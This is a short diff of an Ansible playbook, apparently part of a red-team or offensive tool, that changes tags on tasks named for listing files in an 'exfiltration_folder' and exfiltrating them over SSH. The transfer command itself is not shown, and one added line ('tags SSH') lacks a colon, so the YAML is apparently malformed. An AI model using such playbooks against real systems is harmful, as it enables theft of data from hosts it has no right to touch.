@@ -16,13 +16,14 @@
       when: exfil_check.stat.exists == False
       
     - name: Grab files names form exfiltration_folder and exfl over SSH
-      tags: SSH
+      tags: always
       shell: "find . -maxdepth 1 -type f | cut -d'/' -f2"
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files_list
      
-    - name: Exfil 
+    - name: Exfil
+      tags SSH
       shell: |
         pwd > /tmp/path
         cd {{ exfiltration_folder }}
